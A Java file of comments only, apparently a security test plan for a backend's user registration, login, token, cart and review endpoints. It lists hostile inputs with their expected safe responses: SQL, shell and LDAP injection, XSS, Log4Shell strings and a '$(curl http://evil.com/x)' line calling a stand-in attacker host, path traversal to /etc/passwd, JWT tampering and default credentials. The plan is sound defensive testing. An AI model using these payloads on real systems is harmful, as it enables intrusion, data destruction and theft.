package dev.hope.vulcaobackend;

/*
 * ===========================================================================
 *  TEST SCENARIO PLAN
 *  ---------------------------------------------------------------------------
 *  Full coverage of the RBAC test plan (User / Employer / Staff / Security)
 *  fused with every hostile-input fixture in BadDummyData.java.
 *  Each Scenario is a discrete user story or attack vector.
 *  Each Step is a concrete, runnable test case.
 *  Expected status codes appended where the contract defines one.
 * ===========================================================================
 */
public class TestScenarios {

    // ========================================================================
    //  SECTION A — USER ENTITY
    // ========================================================================

    // ---- A.1 USER REGISTRATION ----
    /** Scenario 1: User registers with valid data * ==== DONE/
    /** Step 1 User submits all required fields with strong password → 201 Created */
    /** Step 2 User submits with optional name fields populated → 201 Created */
    /** Step 3 User submits with international name characters (Pelé, अजय, 用户) → 201 Created */
    /** Step 4 User submits with plus-tag email (user+tag@domain) → 201 Created */
    /** Step 5 User submits with subdomain-deep email → 201 Created */

    /** Scenario 2: User registers with duplicate credentials within same entity ==== DONE*/
    /** Step 1 User registers with email already taken by another user → 409 Conflict */
    /** Step 2 User registers with username already taken by another user → 409 Conflict */
    /** Step 3 User registers with case-variant of existing email (UPPER vs lower) → 409 Conflict */
    /** Step 4 User registers with case-variant of existing username → 409 Conflict */
    /** Step 5 User registers with whitespace-padded existing email → 409 Conflict */
    /** Step 6 User registers with trailing newline on existing username → 409 Conflict */
    /** Step 7 User registers with Unicode NFC variant of NFD-stored email → 409 Conflict */
    /** Step 8 User registers with homograph variant of existing username (Cyrillic а vs Latin a) → 409 Conflict */
    /** Step 9 User registers with zero-width-space appended to existing username → 409 Conflict */
    /** Step 10 User registers with BOM prefix on existing username → 409 Conflict */
    /** Step 11 User registers with null-byte truncation matching an existing username → 409 Conflict */

    /** Scenario 3: User registers with credentials owned by other entity types ===@TODO*/
    /** Step 1 User registers with email already taken by a staff account → 409 Conflict */
    /** Step 2 User registers with email already taken by an employer → 409 Conflict */
    /** Step 3 User registers with username matching an existing staff username → 409 Conflict */
    /** Step 4 User registers with username matching an existing employer username → 409 Conflict */

    /** Scenario 4: User registers with malformed email addresses ==== DONE */
    /** Step 1 User submits email with no @ symbol → 400 Bad Request */
    /** Step 2 User submits email missing local part (@example.com) → 400 Bad Request */
    /** Step 3 User submits email missing domain (user@) → 400 Bad Request */
    /** Step 4 User submits email with spaces inside (user name@x.com) → 400 Bad Request */
    /** Step 5 User submits email with double @ signs → 400 Bad Request */
    /** Step 6 User submits email with leading dot in local part → 400 Bad Request */
    /** Step 7 User submits email with trailing dot before @ → 400 Bad Request */
    /** Step 8 User submits email with consecutive dots in local part → 400 Bad Request */
    /** Step 9 User submits email with dot immediately after @ → 400 Bad Request */
    /** Step 10 User submits email with no TLD (user@host) → 400 Bad Request */
    /** Step 11 User submits email with leading hyphen in domain → 400 Bad Request */
    /** Step 12 User submits email with trailing hyphen in domain → 400 Bad Request */
    /** Step 13 User submits email with HTML/script tags in local part → 400 Bad Request */
    /** Step 14 User submits email with IP-literal host [127.0.0.1] → 400 or 201 per policy */
    /** Step 15 User submits email with IPv6 literal host → 400 or 201 per policy */
    /** Step 16 User submits email with quoted local part containing special chars → 400 or 201 per RFC stance */
    /** Step 17 User submits very-short minimal email (a@b) → 400 Bad Request */
    /** Step 18 User submits email with local part exceeding 64 chars (RFC limit) → 400 Bad Request */
    /** Step 19 User submits email with TLD exceeding 64 chars → 400 Bad Request */
    /** Step 20 User submits email with full address > 320 chars → 400 Bad Request */
    /** Step 21 User submits email with embedded CRLF then Bcc header → 400 Bad Request, no header smuggling */
    /** Step 22 User submits email with null byte then attacker domain → 400 Bad Request, no truncation */
    /** Step 23 User submits email with %00 percent-encoded null → 400 Bad Request */
    /** Step 24 User submits Unicode email (用户@例子.广告) → 201 or 400 per IDN policy */

    /** Scenario 5: User registers with weak or dangerous passwords ===done */
    /** Step 1 User submits empty password → 400 Bad Request */
    /** Step 2 User submits single-character password → 400 Bad Request */
    /** Step 3 User submits password just below minimum length (e.g., 7) → 400 Bad Request */
    /** Step 4 User submits whitespace-only password → 400 Bad Request */
    /** Step 5 User submits password "password" → 400 Bad Request (common password) */
    /** Step 6 User submits password "Password1" → 400 if policy bans common */
    /** Step 7 User submits password "qwerty" → 400 Bad Request */
    /** Step 8 User submits password "12345678" → 400 Bad Request */
    /** Step 9 User submits password "iloveyou" → 400 Bad Request */
    /** Step 10 User submits password equal to username → 400 Bad Request */
    /** Step 11 User submits password equal to email local part → 400 Bad Request */
    /** Step 12 User submits 10000-character password → 400 or 413 */
    /** Step 13 User submits password containing only null bytes → 400 Bad Request */
    /** Step 14 User submits password with null byte and extra suffix (truncation test) → 400, no truncation */
    /** Step 15 User submits password with diacritics (Pässwörd123) → 201, normalize before hash */
    /** Step 16 User submits password with zero-width BOM mid-string → 201 with normalization or 400 */
    /** Step 17 User submits password with zero-width space → 201 with normalization or 400 */
    /** Step 18 User submits password containing only emoji → 400 if policy requires alphanum */
    /** Step 19 User submits password "../../etc/passwd" → 201 (treated as opaque) */
    /** Step 20 User submits password "<script>alert(1)</script>" → 201 (treated as opaque) */
    /** Step 21 User submits password "' OR '1'='1" → 201 (treated as opaque, not interpreted) */

    /** Scenario 6: User registers with missing required fields == DONE*/
    /** Step 1 User submits with no body → 400 Bad Request */
    /** Step 2 User submits empty JSON object → 400 Bad Request */
    /** Step 3 User submits with empty username → 400 Bad Request */
    /** Step 4 User submits with empty email → 400 Bad Request */
    /** Step 5 User submits with empty password → 400 Bad Request */
    /** Step 6 User submits without firstName field → 400 if required, else 201 */
    /** Step 7 User submits without lastName field → 400 if required, else 201 */
    /** Step 8 User submits without password field → 400 Bad Request */

    /** Scenario 7: User registers with null field values == done */
    /** Step 1 User submits null username → 400 Bad Request */
    /** Step 2 User submits null email → 400 Bad Request */
    /** Step 3 User submits null password → 400 Bad Request */
    /** Step 4 User submits null firstName → 400 or 201 per nullability */
    /** Step 5 User submits null lastName → 400 or 201 per nullability */
    /** Step 6 User submits all fields null → 400 Bad Request */

    /** Scenario 8: User registers with whitespace-only or control-char fields ==done*/
    /** Step 1 User submits whitespace-only username → 400 Bad Request */
    /** Step 2 User submits tab-only firstName → 400 Bad Request */
    /** Step 3 User submits newline-only lastName → 400 Bad Request */
    /** Step 4 User submits leading/trailing whitespace email → 400 or 201 with trim */
    /** Step 5 User submits username containing tab/newline/CR → 400 Bad Request */
    /** Step 6 User submits firstName with backspace control char → 400 Bad Request */
    /** Step 7 User submits lastName with bell control char → 400 Bad Request */

    /** Scenario 9: User registers with type-confusion payloads */
    /** Step 1 User submits username as number → 400 Bad Request */
    /** Step 2 User submits firstName as boolean → 400 Bad Request */
    /** Step 3 User submits lastName as JSON array → 400 Bad Request */
    /** Step 4 User submits email as nested JSON object → 400 Bad Request */
    /** Step 5 User submits password as floating-point number → 400 Bad Request */

    /** Scenario 10: User registers with length-boundary payloads ==DONE */
    /** Step 1 User submits 1-character username → 400 if min length > 1 */
    /** Step 2 User submits 500-character username → 400 or 413 */
    /** Step 3 User submits 65535-character username (DB VARCHAR ceiling) → 400 or 413 */
    /** Step 4 User submits 10000-character firstName → 400 or 413 */
    /** Step 5 User submits 10000-character lastName → 400 or 413 */
    /** Step 6 User submits 1MB request body → 413 Payload Too Large */
    /** Step 7 User submits exactly-at-limit value → 201 Created */
    /** Step 8 User submits one-over-limit value → 400 Bad Request */

    /** Scenario 11: User registers with SQL injection payloads  ===done*/
    /** Step 1 User submits username "admin'--" → 400 or 201 sanitized */
    /** Step 2 User submits username "admin' #" → 400 or 201 sanitized */
    /** Step 3 User submits username "' OR '1'='1" → 400 or 201 sanitized */
    /** Step 4 User submits username "' OR 1=1--" → 400 or 201 sanitized */
    /** Step 5 User submits username "admin'; DROP TABLE users; --" → 400 or 201 with users table intact */
    /** Step 6 User submits username "'; DELETE FROM users WHERE 1=1; --" → 400 or 201 with rows intact */
    /** Step 7 User submits username "'; UPDATE users SET role='ADMIN' --" → 201 with role unchanged */
    /** Step 8 User submits username "' UNION SELECT NULL,NULL,NULL--" → 400 or 201 sanitized */
    /** Step 9 User submits username with information_schema UNION → 400 or 201 sanitized */
    /** Step 10 User submits username with error-based @@version probe → 400 or 201 sanitized */
    /** Step 11 User submits username with MySQL SLEEP(5) → response time < 1s */
    /** Step 12 User submits username with MSSQL WAITFOR DELAY → response time < 1s */
    /** Step 13 User submits username with Postgres pg_sleep(5) → response time < 1s */
    /** Step 14 User submits boolean-blind SUBSTR password probe → no observable difference */
    /** Step 15 User submits hex-encoded SQL payload → 400 or 201 sanitized */
    /** Step 16 User submits URL-encoded SQL payload → 400 or 201 sanitized */
    /** Step 17 User submits stacked-query payload (xp_cmdshell) → 400 or 201, no shell exec */
    /** Step 18 User submits SQL in firstName, lastName, email simultaneously → 400, no execution anywhere */

    /** Scenario 12: User registers with NoSQL operator smuggling  ======== DONE*/
    /** Step 1 User submits username as {"$ne": null} → 400 Bad Request */
    /** Step 2 User submits username as {"$gt": ""} → 400 Bad Request */
    /** Step 3 User submits username as {"$regex": ".*"} → 400 Bad Request */
    /** Step 4 User submits username as {"$where": "this.password == this.username"} → 400, no JS exec */
    /** Step 5 User submits password as object operator → 400 Bad Request */

    /** Scenario 13: User registers with LDAP injection payloads */
    /** Step 1 User submits username "*" → 400 or 201 sanitized */
    /** Step 2 User submits username "*)(uid=*))(|(uid=*" → 400 or 201 sanitized */
    /** Step 3 User submits username "admin)(&(password=*))" → 400 or 201 sanitized */
    /** Step 4 User submits username "*)(|(objectClass=*" → 400 or 201 sanitized */
    /** Step 5 User submits username with wildcard suffix "admin*" → 400 or 201 sanitized */

    /** Scenario 14: User registers with command/shell injection payloads */
    /** Step 1 User submits firstName "; ls -la" → 201 with no shell execution */
    /** Step 2 User submits firstName "&& whoami" → 201, no exec */
    /** Step 3 User submits firstName "| cat /etc/passwd" → 201, no exec */
    /** Step 4 User submits firstName "`whoami`" → 201, literal backticks stored */
    /** Step 5 User submits firstName "$(whoami)" → 201, literal dollar-paren stored */
    /** Step 6 User submits firstName "$(curl http://evil.com/x)" → 201, no outbound request */
    /** Step 7 User submits firstName "; rm -rf /" → 201, filesystem intact */
    /** Step 8 User submits firstName with newline injecting shell command → 201, no exec */
    /** Step 9 User submits firstName "%0als%20-la" (URL-encoded) → 201, no exec */
    /** Step 10 User submits firstName "&ping -c 10 127.0.0.1&" → 201, no ping process */

    /** Scenario 15: User registers with XSS payloads */
    /** Step 1 User submits firstName "<script>alert(1)</script>" → 201 with output encoded */
    /** Step 2 User submits firstName "<ScRiPt>alert(1)</ScRiPt>" (case mix) → 201 encoded */
    /** Step 3 User submits firstName "<script src=//evil.com/x.js></script>" → 201 encoded */
    /** Step 4 User submits firstName "<img src=x onerror=alert(1)>" → 201 encoded */
    /** Step 5 User submits firstName "<svg onload=alert(1)>" → 201 encoded */
    /** Step 6 User submits firstName "<svg/onload=alert(1)>" → 201 encoded */
    /** Step 7 User submits firstName "<body onload=alert(1)>" → 201 encoded */
    /** Step 8 User submits firstName "<iframe src=javascript:alert(1)>" → 201 encoded */
    /** Step 9 User submits firstName "<iframe srcdoc=...>" → 201 encoded */
    /** Step 10 User submits firstName "<a href=javascript:alert(1)>" → 201 encoded */
    /** Step 11 User submits firstName "javascript:alert(1)" → 201 encoded */
    /** Step 12 User submits firstName "<input autofocus onfocus=alert(1)>" → 201 encoded */
    /** Step 13 User submits firstName "<select autofocus onfocus=alert(1)>" → 201 encoded */
    /** Step 14 User submits firstName "<textarea autofocus onfocus=alert(1)>" → 201 encoded */
    /** Step 15 User submits firstName "<keygen autofocus onfocus=alert(1)>" → 201 encoded */
    /** Step 16 User submits firstName "<video><source onerror=alert(1)>" → 201 encoded */
    /** Step 17 User submits firstName "<audio src=x onerror=alert(1)>" → 201 encoded */
    /** Step 18 User submits firstName "<details open ontoggle=alert(1)>" → 201 encoded */
    /** Step 19 User submits firstName "<marquee onstart=alert(1)>" → 201 encoded */
    /** Step 20 User submits firstName "\"><script>alert(1)</script>" (attribute breakout) → 201 encoded */
    /** Step 21 User submits firstName "'><script>alert(1)</script>" → 201 encoded */
    /** Step 22 User submits firstName "</title><script>alert(1)</script>" → 201 encoded */
    /** Step 23 User submits firstName "</textarea><script>alert(1)</script>" → 201 encoded */
    /** Step 24 User submits firstName HTML-entity-encoded payload → 201 encoded */
    /** Step 25 User submits firstName URL-encoded XSS payload → 201 encoded */
    /** Step 26 User submits firstName with mixed-case "jaVaScRiPt:" → 201 encoded */
    /** Step 27 User submits firstName with data-URI base64 script → 201 encoded */
    /** Step 28 User submits firstName with full XSS polyglot → 201 encoded */
    /** Step 29 Stored XSS verification: profile retrieval after Step 1 → output is HTML-escaped */

    /** Scenario 16: User registers with path traversal payloads */
    /** Step 1 User submits firstName "../../../etc/passwd" → 201, filesystem not read */
    /** Step 2 User submits firstName "..\\..\\..\\windows\\system32\\config\\sam" → 201, no read */
    /** Step 3 User submits firstName "....//....//....//etc/passwd" → 201, no read */
    /** Step 4 User submits firstName URL-encoded ..%2f traversal → 201, no read */
    /** Step 5 User submits firstName double-URL-encoded traversal → 201, no read */
    /** Step 6 User submits firstName with UTF-8 overlong encoding (..%c0%af) → 201, no read */
    /** Step 7 User submits firstName "/etc/passwd%00.png" → 201, no truncation read */
    /** Step 8 User submits firstName "file:///etc/passwd" → 201, no fetch */
    /** Step 9 User submits firstName "file:///c:/windows/win.ini" → 201, no fetch */
    /** Step 10 User submits firstName UNC path "\\\\evil.com\\share\\file" → 201, no SMB attempt */
    /** Step 11 User submits firstName Windows absolute path → 201, stored as literal */

    /** Scenario 17: User registers with Unicode and encoding attacks */
    /** Step 1 User submits username with RTL override "\u202Eadmin" → 400 or 201 with normalization */
    /** Step 2 User submits username "аdmin" with Cyrillic 'а' → 201 with homograph detection or warning */
    /** Step 3 User submits username with trailing zero-width space → 400 or normalized */
    /** Step 4 User submits username with leading BOM → 400 or normalized */
    /** Step 5 User submits username with embedded null byte → 400 (no truncation) */
    /** Step 6 User submits username with single-codepoint ligature "ﬃ" (decomposes to "ffi") → 201 normalized */
    /** Step 7 User submits username "Å" (U+00C5 vs U+212B duplicate) → 409 if duplicate after NFC */
    /** Step 8 User submits username with ZWJ-emoji sequence → 400 or 201 per emoji policy */
    /** Step 9 User submits username with unpaired UTF-16 surrogate → 400 Bad Request */
    /** Step 10 User submits username with bidi-control characters → 400 or normalized */

    /** Scenario 18: User registers with CRLF / header / log injection */
    /** Step 1 User submits username with literal CRLF then Set-Cookie → 400, no header injection */
    /** Step 2 User submits username with LF then Location header → 400, no redirect */
    /** Step 3 User submits username with %0d%0a percent-encoded CRLF → 400 sanitized */
    /** Step 4 User submits firstName containing forged log line "[INFO] User admin logged in" → 201, escaped in logs */

    /** Scenario 19: User registers with format-string payloads */
    /** Step 1 User submits firstName "%s%s%s%s%s%s" → 201, literal stored */
    /** Step 2 User submits lastName "%n%n%n%n%n" → 201, literal stored */
    /** Step 3 User submits firstName "%x.%x.%x.%x" → 201, no memory leak in logs */
    /** Step 4 User submits firstName "%08x.%08x.%08x.%08x" in password → 201, treated as opaque */

    /** Scenario 20: User registers with template / SSTI / EL / JNDI payloads */
    /** Step 1 User submits firstName "${7*7}" → 201, literal stored, never "49" */
    /** Step 2 User submits firstName "{{7*7}}" → 201, literal stored */
    /** Step 3 User submits firstName "<%= 7*7 %>" → 201, literal stored */
    /** Step 4 User submits firstName "#{7*7}" (Spring EL) → 201, literal stored */
    /** Step 5 User submits firstName Spring SpEL Runtime.exec → 201, no exec */
    /** Step 6 User submits firstName "${jndi:ldap://evil.com/a}" (Log4Shell) → 201, no JNDI lookup */
    /** Step 7 User submits firstName "${jndi:rmi://evil.com/a}" → 201, no RMI lookup */
    /** Step 8 User submits firstName Log4Shell with nested ${::-} obfuscation → 201, no JNDI lookup */
    /** Step 9 User submits firstName Jinja2 "{{config.items()}}" → 201, literal stored */
    /** Step 10 User submits firstName Python class-walk SSTI → 201, literal stored */

    /** Scenario 21: User registers with mass-assignment / role-escalation */
    /** Step 1 User submits body with "role":"ADMIN" → 201, role coerced to USER */
    /** Step 2 User submits body with "isAdmin":true → 201, flag ignored */
    /** Step 3 User submits body with "admin":1 → 201, flag ignored */
    /** Step 4 User submits body with authorities array → 201, authorities ignored */
    /** Step 5 User submits body with permissions array containing "*" → 201, permissions ignored */
    /** Step 6 User submits body with "verified":true → 201, verified=false */
    /** Step 7 User submits body with "emailVerified":true → 201, emailVerified=false */
    /** Step 8 User submits body with "active":true → 201, active per policy default */
    /** Step 9 User submits body with "enabled":true → 201, enabled per policy */
    /** Step 10 User submits body with "locked":false → 201, locked default */
    /** Step 11 User submits body with id=1 → 201, server-assigned id */
    /** Step 12 User submits body with userId=1 → 201, server-assigned id */
    /** Step 13 User submits body with createdAt=1970-01-01 → 201, server timestamp */
    /** Step 14 User submits body with password_hash override → 201, server hashes plaintext */
    /** Step 15 User submits body with __proto__ pollution payload → 201, prototype unaffected */
    /** Step 16 User submits body with constructor.prototype payload → 201, prototype unaffected */

    /** Scenario 22: User registers with duplicate JSON keys */
    /** Step 1 User submits raw JSON with two "username" keys (last-wins) → 400 or 201 per parser */
    /** Step 2 User submits raw JSON with two "role" keys (USER then ADMIN) → 201 with role=USER */
    /** Step 3 User submits raw JSON with two "password" keys → 400 or 201 with consistent value */
    /** Step 4 User submits raw JSON with thousands of duplicated keys → 400 Bad Request */

    /** Scenario 23: User registers with reserved or system usernames */
    /** Step 1 User submits username "admin" → 400 or 409 (reserved) */
    /** Step 2 User submits username "administrator" → 400 or 409 */
    /** Step 3 User submits username "root" → 400 or 409 */
    /** Step 4 User submits username "system" → 400 or 409 */
    /** Step 5 User submits username "support" → 400 or 409 */
    /** Step 6 User submits username "anonymous" → 400 or 409 */
    /** Step 7 User submits username "null" → 400 or 409 */
    /** Step 8 User submits username "undefined" → 400 or 409 */
    /** Step 9 User submits username "API" → 400 or 409 */
    /** Step 10 User submits username "postgres" → 400 or 409 */
    /** Step 11 User submits username "Admin" (case variant of reserved) → 400 or 409 */
    /** Step 12 User submits username "admin " (trailing space) → 400 or 409 after trim */
    /** Step 13 User submits username "ad min" (internal space) → 400 Bad Request */


    // ---- A.2 USER LOGIN ----

    /** Scenario 25: User logs in with valid credentials */
    /** Step 1 User submits correct username and password → 200 OK with token */
    /** Step 2 User submits correct email and password → 200 OK with token */
    /** Step 3 User submits credentials with different surrounding whitespace (after trim) → 200 OK */

    /** Scenario 26: User logs in with invalid credentials */
    /** Step 1 User submits valid username with wrong password → 401 Unauthorized */
    /** Step 2 User submits non-existent username → 401 Unauthorized (same response time) */
    /** Step 3 User submits non-existent email → 401 Unauthorized */
    /** Step 4 User submits valid email with empty password → 400 Bad Request */
    /** Step 5 User submits empty username with valid password → 400 Bad Request */
    /** Step 6 User submits both fields empty → 400 Bad Request */
    /** Step 7 User submits both fields null → 400 Bad Request */
    /** Step 8 Response time for valid vs invalid username differs by < 50ms (no enumeration) */

    /** Scenario 27: User logs in with cross-entity credentials */
    /** Step 1 User uses staff credentials at /users/login → 401 Unauthorized */
    /** Step 2 User uses employer credentials at /users/login → 401 Unauthorized */
    /** Step 3 User uses staff token to access user-only routes → 403 Forbidden */
    /** Step 4 User uses employer token to access user-only routes → 403 Forbidden */

    /** Scenario 28: User login with SQL injection auth bypass */
    /** Step 1 User submits username "admin'--" → 401 Unauthorized */
    /** Step 2 User submits username "admin' #" → 401 Unauthorized */
    /** Step 3 User submits username "' OR '1'='1' --" → 401 Unauthorized */
    /** Step 4 User submits username "' OR 1=1--" → 401 Unauthorized */
    /** Step 5 User submits username "' OR 1=1 LIMIT 1--" → 401 Unauthorized */
    /** Step 6 User submits username "admin') OR ('1'='1" → 401 Unauthorized */
    /** Step 7 User submits username UNION-based payload → 401 Unauthorized */
    /** Step 8 User submits username "' OR EXISTS(SELECT * FROM users)--" → 401 Unauthorized */
    /** Step 9 User submits username "x' OR 'a'='a" → 401 Unauthorized */
    /** Step 10 User submits username with backslash-escaped quote bypass → 401 Unauthorized */
    /** Step 11 User submits SQL payload in password field instead → 401 Unauthorized */
    /** Step 12 User submits SQL payload in both fields → 401 Unauthorized */

    /** Scenario 29: User login with NoSQL operator bypass */
    /** Step 1 User submits username {"$ne":null} and password {"$ne":null} → 400 or 401 */
    /** Step 2 User submits username "admin" and password {"$ne":null} → 400 or 401 */
    /** Step 3 User submits password {"$gt":""} → 400 or 401 */
    /** Step 4 User submits password {"$regex":".*"} → 400 or 401 */

    /** Scenario 30: User login with credential-stuffing list */
    /** Step 1 admin/admin → 401 Unauthorized */
    /** Step 2 admin/password → 401 Unauthorized */
    /** Step 3 root/root → 401 Unauthorized */
    /** Step 4 test/test → 401 Unauthorized */
    /** Step 5 guest/guest → 401 Unauthorized */
    /** Step 6 sa/(empty) → 401 Unauthorized */

    /** Scenario 31: User login length attacks */
    /** Step 1 User submits username 10000 chars → 400 or 413 */
    /** Step 2 User submits password 1000 chars → 401 or 413 */
    /** Step 3 User submits both fields 1MB each → 413 Payload Too Large */

    /** Scenario 32: User login with Unicode normalization quirks */
    /** Step 1 User submits NFC-form username matching NFD-stored → 200 OK if normalization is consistent */
    /** Step 2 User submits NFD-form username matching NFC-stored → 200 OK if normalization is consistent */
    /** Step 3 User submits "café" (U+00E9) vs "cafe\u0301" (e + combining acute) → both work or neither */
    /** Step 4 User submits username with case difference → 401 if case-sensitive, 200 if case-insensitive */
    /** Step 5 User submits username with appended zero-width space → 401 (mismatch) */

    /** Scenario 33: User login with null-byte truncation */
    /** Step 1 User submits username "admin\u0000" → 401, no truncation match */
    /** Step 2 User submits password "Password123\u0000" → 401, no truncation */
    /** Step 3 User submits password "wrong\u0000Password123" → 401, no bypass */

    /** Scenario 34: User login type confusion */
    /** Step 1 User submits username as boolean true → 400 Bad Request */
    /** Step 2 User submits username as integer 1 → 400 Bad Request */
    /** Step 3 User submits username as empty array → 400 Bad Request */
    /** Step 4 User submits username as nested object → 400 Bad Request */

    /** Scenario 35: User login with CRLF/header injection */
    /** Step 1 User submits username with CRLF then X-Forwarded-For → 400 or 401, no header inject */

    /** Scenario 36: User login ReDoS bait */
    /** Step 1 User submits 50-char repeated 'a' then '!' → response < 200ms */
    /** Step 2 User submits 63 'a's then '!' → response < 200ms */

    /** Scenario 37: User login brute-force / rate limiting */
    /** Step 1 User submits 5 wrong passwords in quick succession → 401 each */
    /** Step 2 User submits 10 wrong passwords → 429 Too Many Requests after threshold */
    /** Step 3 User submits 100 wrong passwords → 429 with progressive backoff */
    /** Step 4 After lockout, valid credentials → 429 until cooldown elapses */
    /** Step 5 After cooldown, valid credentials → 200 OK */
    /** Step 6 Rate limit applies per-username and per-IP independently */

    /** Scenario 38: User login mass-assignment DONE     */
    /** Step 1 User submits body with role/isAdmin/authenticated extras → 200 with token reflecting actual role */

    // ---- A.3 USER LOGOUT ----

    /** Scenario 39: User logs out */
    /** Step 1 User logs out with valid token → 200 OK or 204 No Content */
    /** Step 2 User logs out twice (second call after first) → 401 or 204 (idempotent) */
    /** Step 3 User logs out with expired token → 401 Unauthorized */
    /** Step 4 User logs out with no token → 401 Unauthorized */
    /** Step 5 User logs out with malformed token → 401 Unauthorized */
    /** Step 6 After logout, the same token used on protected route → 401 if blacklist enabled */
    /** Step 7 After logout, refresh token revoked → cannot mint new access token */

    // ---- A.4 USER TOKEN / SESSION ----

    /** Scenario 40: User accesses protected route with valid token */
    /** Step 1 User sends valid Bearer token → 200 OK */
    /** Step 2 User sends valid token with extra whitespace in header → 200 OK after normalization */

    /** Scenario 41: User accesses protected route with bad tokens */
    /** Step 1 No Authorization header → 401 Unauthorized */
    /** Step 2 Empty Authorization header → 401 Unauthorized */
    /** Step 3 Authorization "Bearer " with no token → 401 Unauthorized */
    /** Step 4 Authorization "Bearer null" → 401 Unauthorized */
    /** Step 5 Authorization "Bearer undefined" → 401 Unauthorized */
    /** Step 6 Authorization missing "Bearer" prefix (raw token only) → 401 Unauthorized */
    /** Step 7 Authorization "bearer ..." (lowercase) → 401 or 200 per RFC stance */
    /** Step 8 Authorization with trailing characters after token → 401 Unauthorized */

    /** Scenario 42: User accesses with expired or future token */
    /** Step 1 User sends token with exp in the past → 401 Unauthorized */
    /** Step 2 User sends token with nbf in the future → 401 Unauthorized */
    /** Step 3 User sends token with iat in the future → 401 Unauthorized */

    /** Scenario 43: User accesses with malformed JWT */
    /** Step 1 Token with only header part → 401 Unauthorized */
    /** Step 2 Token "..." → 401 Unauthorized */
    /** Step 3 Token "a.b.c" → 401 Unauthorized */
    /** Step 4 Token with non-base64 segments → 401 Unauthorized */
    /** Step 5 Token truncated mid-signature → 401 Unauthorized */

    /** Scenario 44: User accesses with tampered JWT */
    /** Step 1 JWT with alg=none, payload claims ADMIN, no signature → 401 Unauthorized */
    /** Step 2 JWT signed with weak HMAC secret "secret" → 401 Unauthorized */
    /** Step 3 JWT with kid header containing path traversal → 401 Unauthorized, no file read */
    /** Step 4 JWT with jku pointing to attacker domain → 401 Unauthorized, no SSRF */
    /** Step 5 JWT with x5u pointing to attacker domain → 401 Unauthorized, no SSRF */
    /** Step 6 JWT signed with HS256 using public key as secret (RS-to-HS confusion) → 401 Unauthorized */
    /** Step 7 JWT with role claim modified, signature unchanged → 401 Unauthorized */
    /** Step 8 JWT with sub modified to another user's id → 401 Unauthorized */

    /** Scenario 45: User accesses with replayed/stolen token */
    /** Step 1 Token used from a different IP than issued → 200 or 401 per binding policy */
    /** Step 2 Token used after server-side revocation → 401 Unauthorized */
    /** Step 3 Token used after password change → 401 Unauthorized */

    /** Scenario 46: User accesses with hostile token values */
    /** Step 1 Token containing CRLF + injected header → 401, no header injection downstream */
    /** Step 2 Token of size 100KB → 401 or 413 */
    /** Step 3 Token equal to "' OR '1'='1" → 401 Unauthorized */
    /** Step 4 Token equal to {"$ne":null} → 401 Unauthorized */

    // ---- A.5 USER CART ----

    /** Scenario 47: User adds items to cart */
    /** Step 1 User adds valid product with quantity 1 → 201 Created */
    /** Step 2 User adds same product again → 200 OK with quantity incremented */
    /** Step 3 User adds product with quantity > stock → 400 or 409 with stock message */
    /** Step 4 User adds product with quantity 0 → 400 Bad Request */
    /** Step 5 User adds product with negative quantity → 400 Bad Request */
    /** Step 6 User adds product with quantity Integer.MAX_VALUE → 400 (overflow guard) */
    /** Step 7 User adds product with quantity as string → 400 Bad Request */
    /** Step 8 User adds product with non-existent productId → 404 Not Found */
    /** Step 9 User adds product with productId of soft-deleted product → 404 Not Found */
    /** Step 10 User adds product with SQL injection in productId → 400 or 404 sanitized */
    /** Step 11 User adds product with NoSQL operator in productId → 400 Bad Request */
    /** Step 12 User adds product with productId for another tenant's product → 403 or 404 */

    /** Scenario 48: User removes items from cart */
    /** Step 1 User removes existing cart item → 200 OK or 204 No Content */
    /** Step 2 User removes non-existent cart item → 404 Not Found */
    /** Step 3 User removes already-removed item → 404 (idempotent) */
    /** Step 4 User clears cart with no items → 200 OK or 204 (idempotent) */
    /** Step 5 User clears cart with multiple items → 200 OK, cart empty */

    /** Scenario 49: Cart IDOR */
    /** Step 1 User A modifies User B's cart by ID → 403 Forbidden */
    /** Step 2 User A reads User B's cart by ID → 403 Forbidden */
    /** Step 3 User A removes item from User B's cart → 403 Forbidden */
    /** Step 4 User A clears User B's cart → 403 Forbidden */
    /** Step 5 User A passes own cartId but with userId override in body → 403 or ignored */

    /** Scenario 50: Cart concurrency */
    /** Step 1 Two simultaneous adds of same product from same session → final quantity correct */
    /** Step 2 Add and remove in parallel → no orphan rows, no negative quantity */
    /** Step 3 Two sessions adding same item → final quantity reflects both adds */
    /** Step 4 User updates cart while another session checks out → consistent state */

    // ---- A.6 USER REVIEWS ----

    /** Scenario 51: User reviews entities */
    /** Step 1 User reviews a product → 201 Created */
    /** Step 2 User reviews a company → 201 Created */
    /** Step 3 User reviews a staff member → 201 Created */
    /** Step 4 User reviews an employer → 201 Created */
    /** Step 5 User reviews same product twice → 409 Conflict */
    /** Step 6 User reviews same company twice → 409 Conflict */
    /** Step 7 User reviews entity that does not exist → 404 Not Found */
    /** Step 8 User reviews soft-deleted entity → 404 Not Found */

    /** Scenario 52: User updates and deletes own reviews */
    /** Step 1 User updates own review → 200 OK */
    /** Step 2 User deletes own review → 200 OK or 204 */
    /** Step 3 User updates someone else's review → 403 Forbidden */
    /** Step 4 User deletes someone else's review → 403 Forbidden */
    /** Step 5 User updates non-existent review id → 404 Not Found */
    /** Step 6 User deletes non-existent review id → 404 Not Found */

    /** Scenario 53: Review content validation */
    /** Step 1 User submits rating outside allowed range (e.g., 6 of 5) → 400 Bad Request */
    /** Step 2 User submits negative rating → 400 Bad Request */
    /** Step 3 User submits rating as decimal when integer expected → 400 Bad Request */
    /** Step 4 User submits comment exceeding max length → 400 or 413 */
    /** Step 5 User submits empty comment → 400 if required, else 201 */
    /** Step 6 User submits review with XSS in comment → 201 with comment HTML-escaped on render */
    /** Step 7 User submits review with SQL injection in comment → 201 sanitized */
    /** Step 8 User submits review with HTML in comment → 201 stripped or escaped */
    /** Step 9 User submits review with extremely long Unicode emoji string → 201 or 400 */

    // ---- A.7 USER AUTHORIZATION BOUNDARIES ----

    /** Scenario 54: User crosses entity-role boundaries */
    /** Step 1 User accesses /executive/dashboard → 403 Forbidden */
    /** Step 2 User accesses /staff/dashboard → 403 Forbidden */
    /** Step 3 User accesses /admin/* routes → 403 Forbidden */
    /** Step 4 User accesses another user's profile by id → 403 Forbidden (IDOR) */
    /** Step 5 User accesses another user's orders by id → 403 Forbidden */
    /** Step 6 User attempts admin actions via verb tampering (PUT vs PATCH) → 403 Forbidden */
    /** Step 7 User attempts to escalate by adding role param to query string → 403, ignored */

    // ========================================================================
    //  SECTION B — EMPLOYER (EXECUTIVE) ENTITY
    // ========================================================================

    // ---- B.1 EMPLOYER REGISTRATION ----

